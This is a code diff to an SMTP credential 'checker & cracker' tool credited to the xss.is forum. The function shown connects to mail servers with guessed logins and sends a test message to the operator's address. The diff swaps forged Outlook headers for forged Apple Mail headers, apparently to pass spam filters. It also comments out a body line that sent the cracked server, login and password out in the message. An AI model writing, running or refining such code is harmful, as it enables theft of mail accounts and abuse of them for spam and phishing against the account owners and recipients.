@@ -45,7 +45,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v25.04.20{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v25.04.26{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -375,15 +375,27 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
 			'Subject: smtp test',
 			'Return-Path: '+smtp_user,
 			'Reply-To: '+smtp_user,
-			'X-Priority: 1',
-			'X-MSmail-Priority: High',
-			'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
-			'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
-			'MIME-Version: 1.0',
+			'X-Mailer: Apple Mail (2.3774.500.171.1.1)',
+			'Mime-Version: 1.0 (Mac OS X Mail 16.0 \\(3774.500.171.1.1\\))',
 			'Content-Type: text/html; charset="utf-8"',
-			'Content-Transfer-Encoding: 8bit'
+			'Content-Transfer-Encoding: quoted-printable'
 		]
-		body = f'{smtp_server}|{port}|{smtp_login}|{password}'
+		# headers_arr = [
+		# 	'From: test <%s>'%smtp_user,
+		# 	'Resent-From: admin@localhost',
+		# 	'To: '+verify_email,
+		# 	'Subject: smtp test',
+		# 	'Return-Path: '+smtp_user,
+		# 	'Reply-To: '+smtp_user,
+		# 	'X-Priority: 1',
+		# 	'X-MSmail-Priority: High',
+		# 	'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
+		# 	'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
+		# 	'MIME-Version: 1.0',
+		# 	'Content-Type: text/html; charset="utf-8"',
+		# 	'Content-Transfer-Encoding: 8bit'
+		# ]
+		# body = f'{smtp_server}|{port}|{smtp_login}|{password}'
 		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
 		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
 	s.close()
